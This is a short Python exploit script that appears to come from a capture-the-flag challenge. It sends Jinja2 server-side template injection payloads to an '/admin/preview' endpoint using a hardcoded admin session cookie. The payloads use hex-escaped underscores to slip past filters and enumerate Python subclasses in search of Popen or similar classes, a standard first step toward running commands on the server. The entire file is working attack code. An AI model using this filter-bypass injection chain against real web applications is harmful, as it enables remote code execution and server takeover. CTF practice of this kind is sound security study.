import urllib.request
import urllib.parse
import json

url = "https://1c8df2b4-ctf.dsg.id/admin/preview"
headers = {
    "Cookie": "session=eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImtlcGFsYW9wcyJ9.ajIcsg.BHuh5qCyj4sGnC0Gwa2_4m_ePwg",
    "Content-Type": "application/json"
}

def send_payload(payload):
    data = json.dumps({"template": payload}).encode('utf-8')
    req = urllib.request.Request(url, data=data, headers=headers)
    try:
        resp = urllib.request.urlopen(req)
        return resp.read().decode('utf-8')
    except urllib.error.HTTPError as e:
        return f"HTTP {e.code}: {e.read().decode('utf-8')}"

# find Popen
for i in range(500):
    payload = f"{{% set a = ()|attr('\\x5f\\x5fclass\\x5f\\x5f')|attr('\\x5f\\x5fbase\\x5f\\x5f')|attr('\\x5f\\x5fsubclasses\\x5f\\x5f')() %}} {{{{ a[{i}] }}}}"
    res = send_payload(payload)
    if "Popen" in res or "catch_warnings" in res or "wrap_close" in res:
        print(f"Index {i}: {res}")
